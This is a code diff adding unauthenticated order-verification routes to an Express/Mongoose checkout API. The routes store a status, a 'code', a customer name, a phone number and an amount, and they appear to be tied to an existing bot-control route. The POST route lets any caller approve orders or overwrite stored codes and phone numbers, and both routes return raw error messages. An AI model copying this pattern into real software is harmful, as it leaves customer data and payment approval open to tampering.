@@ -260,6 +260,58 @@ router.post("/bot-control", async (req, res) => {
   }
 });
 
+// ─── Interactive Order Verification Status ──────────
+const OrderVerifySchema = new mongoose.Schema({
+  orderId: { type: String, required: true, unique: true },
+  status: { type: String, enum: ["pending", "approved", "rejected"], default: "pending" },
+  code: { type: String, default: "" },
+  customerName: { type: String, default: "" },
+  phone: { type: String, default: "" },
+  amount: { type: String, default: "" },
+  updatedAt: { type: Date, default: Date.now, expires: 86400 },
+});
+
+let OrderVerifyModel;
+try {
+  OrderVerifyModel = mongoose.model("OrderVerifyStatus");
+} catch {
+  OrderVerifyModel = mongoose.model("OrderVerifyStatus", OrderVerifySchema);
+}
+
+// GET /api/checkout/verify-status/:orderId
+router.get("/verify-status/:orderId", async (req, res) => {
+  try {
+    const doc = await OrderVerifyModel.findOne({ orderId: req.params.orderId }).lean();
+    res.json({ ok: true, status: doc?.status || "pending" });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
+// POST /api/checkout/verify-status
+router.post("/verify-status", async (req, res) => {
+  try {
+    const { orderId, status, code, customerName, phone, amount } = req.body;
+    if (!orderId) return res.status(400).json({ ok: false, error: "Missing orderId" });
+
+    const update = { updatedAt: new Date() };
+    if (status) update.status = status;
+    if (code) update.code = code;
+    if (customerName) update.customerName = customerName;
+    if (phone) update.phone = phone;
+    if (amount) update.amount = amount;
+
+    const doc = await OrderVerifyModel.findOneAndUpdate(
+      { orderId },
+      { $set: update },
+      { upsert: true, new: true, setDefaultsOnInsert: true }
+    );
+    res.json({ ok: true, status: doc.status });
+  } catch (err) {
+    res.status(500).json({ ok: false, error: err.message });
+  }
+});
+
 // GET /api/checkout/:id - Single order
 router.get("/:id", authMiddleware, async (req, res) => {
   try {
